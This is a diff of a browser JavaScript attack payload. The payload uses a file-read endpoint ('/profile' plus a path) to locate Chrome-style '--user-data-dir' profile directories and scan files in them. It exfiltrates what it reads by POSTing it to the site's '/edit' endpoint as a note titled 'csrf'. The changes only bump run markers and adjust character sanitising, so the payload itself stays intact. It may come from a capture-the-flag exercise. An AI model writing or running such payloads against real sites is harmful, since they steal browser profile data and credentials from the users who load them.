@@ -1,8 +1,9 @@
 (async()=>{
-if(window.__codexRun0615ah)return;
-window.__codexRun0615ah=1;
+if(window.__codexRun0615ai)return;
+window.__codexRun0615ai=1;
 
-const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:_\\/-]/g,' '))});
+const clean=t=>String(t).replace(/[^A-Za-z0-9 !.:()]/g,' ');
+const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(clean(t))});
 const read=async p=>{
  try{
   let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
@@ -18,7 +19,7 @@ const readRange=async(p,o,l=1500)=>{
 
 const dirsFrom=c=>{
  let out=[];
- let s=c.replace(/\x00/g,' ');
+ let s=c.replace(/\x00/g,' ').replace(/\.+/g,'.');
  for(let x of s.matchAll(/--user-data-dir=([^ ]+)/g)){
   if(!out.includes(x[1]))out.push(x[1]);
  }
@@ -89,7 +90,7 @@ const scanFile=async p=>{
  return false;
 };
 
-post('profile scan 0615ah');
+post('profile scan 0615ai');
 let dirs=await findDirs();
 if(!dirs.length){post('profile none');return}
 
